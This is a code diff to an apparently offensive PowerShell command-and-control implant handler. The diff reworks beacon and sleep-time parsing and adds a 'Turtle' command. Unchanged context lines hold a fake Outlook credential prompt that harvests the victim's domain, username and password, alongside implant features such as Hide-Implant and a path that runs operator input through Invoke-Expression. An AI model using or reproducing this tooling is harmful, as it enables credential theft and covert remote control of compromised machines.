@@ -117,8 +117,8 @@ function Implant-Handler
     function print-help {
         write-host `n "Implant Features: " -ForegroundColor Green
         write-host "=====================" -ForegroundColor Red
-        write-host " Beacon <time in seconds>"-ForegroundColor Green 
-        write-host " Start-Sleep <time in seconds>"-ForegroundColor Green 
+        write-host " Beacon 60s / Beacon 10m / Beacon 2h"-ForegroundColor Green 
+        write-host " Turtle 60s / Tutle 30m / Turtle 8h "-ForegroundColor Green 
         write-host " Kill-Implant"-ForegroundColor Green 
         write-host " Hide-Implant"-ForegroundColor Green 
         write-host " Unhide-Implant"-ForegroundColor Green 
@@ -1373,16 +1373,57 @@ param
                 $pscommand = '$ps = $Host.ui.PromptForCredential("Outlook requires your credentials","Please enter your active directory logon details:","$env:userdomain\$env:username",""); $user = $ps.GetNetworkCredential().username; $domain = $ps.GetNetworkCredential().domain; $pass = $ps.GetNetworkCredential().password; echo "`nDomain: $domain `nUsername: $user `nPassword: $pass `n"'
                 write-host "This will stall the implant until the user either enter's their credentials or cancel's the popup window"
             }
-            if (($pscommand.ToLower().StartsWith('sleep')) -or ($pscommand.ToLower().StartsWith('beacon'))) 
+            if (($pscommand.ToLower().StartsWith('sleep')) -or ($pscommand.ToLower().StartsWith('beacon'))-or ($pscommand.ToLower().StartsWith('set-beacon'))) 
             {
-                $sleeptime = $pscommand -replace 'sleep ', ''
-                $sleeptime = $pscommand -replace 'beacon ', ''
-                $pscommand = '$sleeptime = '+$sleeptime
+                $pscommand = $pscommand -replace 'set-beacon ', ''
+                $pscommand = $pscommand -replace 'sleep ', ''
+                $pscommand = $pscommand -replace 'beacon ', ''
+                $sleeptime = $pscommand
+                if ($sleeptime.ToLower().Contains('m')) { 
+                    $sleeptime = $sleeptime -replace 'm', ''
+                    [int]$newsleep = $sleeptime 
+                    [int]$newsleep = $newsleep * 60
+                }
+                elseif ($sleeptime.ToLower().Contains('h')) { 
+                    $sleeptime = $sleeptime -replace 'h', ''
+                    [int]$newsleep1 = $sleeptime 
+                    [int]$newsleep2 = $newsleep1 * 60
+                    [int]$newsleep = $newsleep2 * 60
+                }
+                elseif ($sleeptime.ToLower().Contains('s')) { 
+                    $newsleep = $sleeptime -replace 's', ''
+                } else {
+                    $newsleep = $sleeptime
+                }
+                $pscommand = '$sleeptime = '+$newsleep
                 $query = "UPDATE Implants SET Sleep=@Sleep WHERE RandomURI=@RandomURI"
                 Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-                    Sleep = $sleeptime
+                    Sleep = $newsleep
                     RandomURI = $psrandomuri
                 } | Out-Null
+            }
+            if (($pscommand.ToLower().StartsWith('turtle')) -or ($pscommand.ToLower().StartsWith('start-sleep'))) 
+            {
+                $pscommand = $pscommand -replace 'start-sleep ', ''
+                $pscommand = $pscommand -replace 'turtle ', ''
+                $sleeptime = $pscommand
+                if ($sleeptime.ToLower().Contains('m')) { 
+                    $sleeptime = $sleeptime -replace 'm', ''
+                    [int]$newsleep = $sleeptime 
+                    [int]$newsleep = $newsleep * 60
+                }
+                elseif ($sleeptime.ToLower().Contains('h')) { 
+                    $sleeptime = $sleeptime -replace 'h', ''
+                    [int]$newsleep1 = $sleeptime 
+                    [int]$newsleep2 = $newsleep1 * 60
+                    [int]$newsleep = $newsleep2 * 60
+                }
+                elseif ($sleeptime.ToLower().Contains('s')) { 
+                    $newsleep = $sleeptime -replace 's', ''
+                } else {
+                    $newsleep = $sleeptime
+                }
+                $pscommand = 'Start-Sleep '+$newsleep
             }
             if ($pscommand.tolower().startswith('add-creds')){
                 $pscommand|Invoke-Expression
